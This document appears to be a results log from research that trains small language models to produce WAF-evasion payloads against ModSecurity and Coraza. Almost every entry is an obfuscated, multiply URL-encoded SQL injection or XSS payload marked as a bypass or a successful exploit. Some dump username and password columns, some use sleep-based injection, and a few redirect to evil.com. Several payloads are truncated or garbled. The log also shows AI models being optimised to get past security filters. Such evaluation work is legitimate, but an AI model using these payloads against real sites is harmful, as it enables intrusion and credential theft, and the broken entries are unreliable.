### Gemma_2B_Phase2 (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520
```

### Gemma_2B_Phase2 (phase1) - ModSecurity - XSS
- Technique: XSS Keyword (heuristic)
- Reason: exploit_success
- Payload:
```
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
```

### Gemma_2B_Phase2 (phase2) - ModSecurity - SQLI
- Technique: obf_comment_sql+obf_double_url_encode+obf_whitespace_url
- Reason: waf_bypass_only
- Payload:
```
%2527/%252a%252a/union/%252a%252a/select/%252a%252a/1%252cUSER%2528%2529%252c3--/%252a%252a/
```

### Gemma_2B_Phase2 (phase2) - ModSecurity - XSS
- Technique: XSS Body onload
- Reason: exploit_success
- Payload:
```
%253Cbody%2520onload%253Dalert%25281%2529%253E
```

### Gemma_2B_Phase2 (phase3) - ModSecurity - SQLI
- Technique: Context-aware Obfuscation
- Reason: waf_bypass_only
- Payload:
```
%252527%252520or%252520%252527a%252527%25253D%252527a
```

### Gemma_2B_Phase2 (phase3) - ModSecurity - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
%253Cbody%2520onload%253Dalert%25281%2529%253E
```

### Gemma_2B_Phase2 (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520
```

### Gemma_2B_Phase2 (phase1) - ModSecurity - XSS
- Technique: XSS Keyword (heuristic)
- Reason: exploit_success
- Payload:
```
%253Cdiv%2520draggable%253D%2522true%2522%2520contenteditable%253Edrag%2520me%253C/div%253E%253Cinput%2520ondragover%253Dalert%25281%2529%2520contenteditable%253Edrop%2520here%253C/input%253E
```

### Gemma_2B_Phase2 (phase2) - ModSecurity - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%252527%252520AND%252520mULTILINESTRiNG%252528%252528SElect%252520gRoUp_coNcAT%252528uSerNAMe%25252C0x3a%25252CPASsword%252529%252520FRoM%252520uSers%252529%252529%252523
```

### Gemma_2B_Phase2 (phase2) - ModSecurity - XSS
- Technique: obf_case_random+obf_double_url_encode+obf_url_encode_adv_obf
- Reason: exploit_success
- Payload:
```
%25253CScrIpT%25253EAleRt%2525281%252529%25253c/SCrIpT%25253e
```

### Gemma_2B_Phase2 (phase3) - ModSecurity - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%252527%252520/%25252A%252521UNioN%25252a/%252520/%25252A%252521selecT%25252A/%2525201%25252CUSer%252528%252529%25252c3--%252520
```

### Gemma_2B_Phase2 (phase3) - ModSecurity - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
ONMoUseovEr=
```

### Gemma_2B_RL (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520
```

### Gemma_2B_RL (phase2) - ModSecurity - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%2525252527%2525252520%25252F%25252A%252521OR%25252A%25252F%2525252520MULTILINESTRING%2525252528%2525252528%25252F%25252A%252521SELECT%25252A%25252F%2525252520GROUP_CONCAT%2525252528username%252525252C0x3a%252525252Cpassw%25252F%25252A%252521or%25252A%25252FD%2525252529%2525252520FROM%252525252
```

### Gemma_2B_RL (phase2) - ModSecurity - XSS
- Technique: obf_case_random+obf_double_url_encode+obf_url_encode_adv_obf
- Reason: exploit_success
- Payload:
```
%25253CsCriPt%25253EaLERt%2525281%252529%25253C/ScrIpT%25253E
```

### Gemma_2B_RL (phase3) - ModSecurity - SQLI
- Technique: Context-aware Obfuscation
- Reason: waf_bypass_only
- Payload:
```
%2527/%252a%252A/UNiON/%252a%252A/sElEct/%252A%252a/1%252c2%2523
```

### Gemma_2B_RL (phase3) - ModSecurity - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
```

### Gemma_2B_RL (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520AND%2520%2528SELECT%25201%2520FROM%2520%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529--%2520
```

### Gemma_2B_RL (phase1) - ModSecurity - XSS
- Technique: XSS Keyword (heuristic)
- Reason: exploit_success
- Payload:
```
%253Cspan%253E%253C%252Fbody%253E%253C%252Fspan%253E
```

### Gemma_2B_RL (phase2) - ModSecurity - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%25252527%25252520OR%25252520MULTILINESTRING%25252528%25252528SELECT%25252520GROUP_CONCAT%25252528username%2525252C0x3a%2525252Cpassword%25252529%25252520FROM%25252520users%25252529%25252529--%25252520
```

### Gemma_2B_RL (phase2) - ModSecurity - XSS
- Technique: obf_case_random+obf_double_url_encode+obf_url_encode_adv_obf
- Reason: exploit_success
- Payload:
```
%25253csCriPt%25253eaLERT%2525281%252529%25253c&#47;ScripT%25253e
```

### Gemma_2B_RL (phase3) - ModSecurity - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%2527%2520AND%25201%253D%2528SELECT%2520CAST%2528%2540%2540VERSION%2520AS%2520INT%2529%2529-- /*45*/
```

### Gemma_2B_RL (phase3) - ModSecurity - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
%25253Ciframe%252520onmouseover%25253D%252527prompt%2525281%252529%252527%25253E%25253C%25252Fiframe%25253E
```

### Phi3_Mini_RL (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: exploit_success
- Payload:
```
1%252520or%2525201%25253d1
```

### Phi3_Mini_RL (phase1) - ModSecurity - XSS
- Technique: XSS Keyword (heuristic)
- Reason: exploit_success
- Payload:
```
%253Ckeygen%2520onend%253Dprint%2528%2529%253E
```

### Phi3_Mini_RL (phase2) - ModSecurity - SQLI
- Technique: obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%253D",
```

### Phi3_Mini_RL (phase3) - ModSecurity - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%25252CA42C2660866B43E26679814A32F11312421268160A0EACF0
```

### Phi3_Mini_RL (phase3) - ModSecurity - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
%26%2347%3b%28%28%5c%25253D%29%7c%28%3d%29%29%5b%5
```

### Phi3_Mini_RL (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: exploit_success
- Payload:
```
1%252520OR%2525201%25253D1
```

### Phi3_Mini_RL (phase1) - ModSecurity - XSS
- Technique: XSS Keyword (heuristic)
- Reason: exploit_success
- Payload:
```
%25253Cbody%25252509onload%25253Dalert%2525281%252529%25253E
```

### Phi3_Mini_RL (phase2) - ModSecurity - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%252527%252520OR%252520MUltIpOinT%252528%252528Select%252520gROUP_COnCaT%252528COlUmN_name%252529%252520frOM%252520InfoRMaTion_ScHeMA.coLUmNs%252520WheRE%252520tABLE_NAmE%25253d%252527uSeRs%252527%252529%252529--%252520",
```

### Phi3_Mini_RL (phase3) - ModSecurity - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%25252527%25252520AND%252525201%2525253D%25252528S
```

### Phi3_Mini_RL (phase3) - ModSecurity - XSS
- Technique: Probing-based Tag Selection
- Reason: exploit_success
- Payload:
```
%253Cembed%2520OnMoUseovER%253D%2527String.fromCha
```

### Qwen_3B_RL (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520
```

### Qwen_3B_RL (phase1) - ModSecurity - XSS
- Technique: non_script_xss
- Reason: exploit_success
- Payload:
```
%253Cimg%2520onresize%253D%2527top.location.href%253D%2527%252F%252Fevil.com%2527%2527%253E%253C%252Fimg%253E
```

### Qwen_3B_RL (phase2) - ModSecurity - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%25252527%25252520and%25252520multilinestring%25252528%25252528select%25252520group_concat%25252528USERNAME%2525252c0X3A%2525252cPASSWORD%25252529%25252520from%25252520USERS%25252529%25252529%25252523
```

### Qwen_3B_RL (phase2) - ModSecurity - XSS
- Technique: XSS Body onload
- Reason: exploit_success
- Payload:
```
%253Cbody%2520onload%253Dalert%25281%2529%253E
```

### Qwen_3B_RL (phase3) - ModSecurity - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%252527%252529%252529%252520OR%252520POLYGON%252528%252528SELECT%252520GROUP_CONCAT%252528table_name%252529%252520FROM%252520information_schema.tables%252520WHERE%252520table_schema%25253DDATABASE%252528%252529%252529%252529--%252520
```

### Qwen_3B_RL (phase3) - ModSecurity - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
onmouseover=
```

### Qwen_3B_RL (phase1) - ModSecurity - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520
```

### Qwen_3B_RL (phase1) - ModSecurity - XSS
- Technique: XSS Keyword (heuristic)
- Reason: exploit_success
- Payload:
```
%253Cinput%2520onfocusout%253Dalert%25281%2529%2520id%253Dx%253E%253Cinput%2520autofocus%253E
```

### Qwen_3B_RL (phase2) - ModSecurity - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%25252527%25252520and%25252520multilinestring%25252528%25252528select%25252520group_concat%25252528USERNAME%2525252c0X3A%2525252cPASSWORD%25252529%25252520from%25252520USERS%25252529%25252529--%25252520
```

### Qwen_3B_RL (phase2) - ModSecurity - XSS
- Technique: XSS Body onload
- Reason: exploit_success
- Payload:
```
%253CboDy%2520OnlOAd%253DalErT%25281%2529%253E
```

### Qwen_3B_RL (phase3) - ModSecurity - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%25252527%25252520%252F%252A%2521UnIon%252A%252F%25252520%252F%252A%2521selECT%252A%252F%252525201%2525252CuSER%25252528%25252529%2525252C3--%25252520
```

### Qwen_3B_RL (phase3) - ModSecurity - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
ONMOUSEOVER%3d
```

### Gemma_2B_Phase2 (phase1) - Coraza - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520
```

### Gemma_2B_Phase2 (phase1) - Coraza - XSS
- Technique: non_script_xss
- Reason: exploit_success
- Payload:
```
%253cDIV%2520ONMOUSEOUT%253d%2527TOP.LOCATION.HREF%253d%2527%252f%252fEVIL.COM%2527%2527%253e%253c%252fDIV%253e
```

### Gemma_2B_Phase2 (phase2) - Coraza - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%2525252527%2525252520AND%2525252520MULTILINESTRING%2525252528%2525252528SELECT%2525252520GROUP_CONCAT%2525252528username%252525252C0x3a%252525252Cpassword%2525252529%2525252520FROM%2525252520users%2525252529%2525252529--%2525252520
```

### Gemma_2B_Phase2 (phase2) - Coraza - XSS
- Technique: obf_case_random+obf_double_url_encode+obf_url_encode_adv_obf
- Reason: exploit_success
- Payload:
```
%25253CSCRipT%25253eALeRt%2525281%252529%25253C%26%2347%3bSCriPT%25253e
```

### Gemma_2B_Phase2 (phase3) - Coraza - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%25252527%25252520AND%25252520%25252528selecT%252525201%25252520froM%25252520%25252528SeleCt%25252528Sleep%252525285%25252529%25252529%25252529A%25252529--%25252520
```

### Gemma_2B_Phase2 (phase3) - Coraza - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
%253Csvg%2520ONcUT%253D%2527alert%25281%2529%2527%253E%2526%252360%253B%2526%252347%253Bbody%2526%252362%253B%253C%252Fsvg%253E
```

### Gemma_2B_RL (phase1) - Coraza - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: waf_bypass_only
- Payload:
```
%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520
```

### Gemma_2B_RL (phase1) - Coraza - XSS
- Technique: non_script_xss
- Reason: exploit_success
- Payload:
```
%253cIMG%2520oNCHange%253d%2527sTRING.FROMcHARcODE%252899%252c111%252c110%252c102%252c105%252c114%252c109%2529%25281%2529%2527%253e%253c%252fIMG%2
```

### Gemma_2B_RL (phase2) - Coraza - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%252527%252520AnD%252520mulTIlInEstRing%252528%252528seLECt%252520GROUp_CONCat%252528USERnaMe_cONcAt%252528%252529%25252C0x3a%25252cPaSSwOrd%252529%252520FRom%252520useRS%252529%252529--%252520
```

### Gemma_2B_RL (phase2) - Coraza - XSS
- Technique: obf_case_random+obf_double_url_encode+obf_url_encode_adv_obf
- Reason: exploit_success
- Payload:
```
%2525253csCriPt%2525253eaLERT%252525281%25252529%2525253c%26%2347%3BSCRIPt%2525253e
```

### Gemma_2B_RL (phase3) - Coraza - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
AdmIN%252527%2F%25252a%25252a%2FaNd%2F%25252A%25252a%2f%252528sEleCt%2F%25252A%25252a%2F1%2F%25252A%25252a%2ffROm%2f%25252a%25252a%2F%252528selEct%252528sleEP%2525285%252529%252529%252529a%252529--%2F%25252a%25252a%2F
```

### Gemma_2B_RL (phase3) - Coraza - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
%253cOBJECT%2520ONMOUSEOUT%253d%2527PROMPT%25281%2529%2527%253e%253c%252fOBJECT%253e
```

### Phi3_Mini_RL (phase1) - Coraza - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: exploit_success
- Payload:
```
1%252520Or%2525201%25253D1
```

### Phi3_Mini_RL (phase1) - Coraza - XSS
- Technique: non_script_xss
- Reason: exploit_success
- Payload:
```
%253Cobject%2520onmouseleave%253D%2527confirm%25281%2529%2527%253E%253C%252Fobject%253E
```

### Phi3_Mini_RL (phase2) - Coraza - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%20--",
```

### Phi3_Mini_RL (phase2) - Coraza - XSS
- Technique: obf_case_random+obf_double_url_encode+obf_url_encode_adv_obf
- Reason: exploit_success
- Payload:
```
%252526%25252360%25253b%252526%252523115%25253B%252526%25252399%25253b%252526%252523114%25253b%252526%252523105%25253B%252526%252523112%25253B%252526%252523116%25253B%252526%25252362%25253B%252526%25252397%25253B%252526%252523108%25253b%252526%252523101%25253B%252526%252523114%25253B%252526%252523116%25253B%252526%25252340%25253B%252526%25252349%25253B%252526%25252341%25253B%252526%25252360%25253B%252526%25252347%25253b%252526%252523115%25253b%252526%25252399%25253b%252526%252523114%25253B%252526%252523105%25253b%252526%252523112%25253b%252526%252523116%25253B%252526%25252362%25253B",
```

### Phi3_Mini_RL (phase3) - Coraza - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
%2520easiest%2520mitigation%2520to%2520this%252
```

### Phi3_Mini_RL (phase3) - Coraza - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
%25253csCRIPt%25253eaL
```

### Qwen_3B_RL (phase1) - Coraza - SQLI
- Technique: obf_double_url_encode+obf_whitespace_url+obf_comment_sql
- Reason: exploit_success
- Payload:
```
1%2520OR%25201%253D1
```

### Qwen_3B_RL (phase1) - Coraza - XSS
- Technique: non_script_xss
- Reason: exploit_success
- Payload:
```
- %253cINPUT%2520ONKEYDOWN%253d%2527sTRING.FROMcHARcODE%252899%252c111%252c110%252c102%252c105%252c114%252c109%2529%25281%2529%2527%253e%253c%252fINPUT%
```

### Qwen_3B_RL (phase2) - Coraza - SQLI
- Technique: Triple URL MULTILINESTRING Error_adv_obf
- Reason: waf_bypass_only
- Payload:
```
%252527%252520or%252520muLTIliNeStRing%252528%252528sElECT%252520groUP_ConcaT%252528USeRnaME%25252C0X3a%25252cPaSSwOrd%252529%252520from%252520uSerS%252529%252529%252523
```

### Qwen_3B_RL (phase2) - Coraza - XSS
- Technique: obf_case_random+obf_double_url_encode+obf_url_encode_adv_obf
- Reason: exploit_success
- Payload:
```
", alert('XSS'), '"];confirm(65)//
```

### Qwen_3B_RL (phase3) - Coraza - SQLI
- Technique: Adaptive Multi-layer Encoding
- Reason: waf_bypass_only
- Payload:
```
to%252520see%252520what%252520happens%25252C%252520just%252520execute%252520the%252520following%252520code%25253A
```

### Qwen_3B_RL (phase3) - Coraza - XSS
- Technique: Adaptive Event Handler
- Reason: exploit_success
- Payload:
```
-ONCLICK=
```
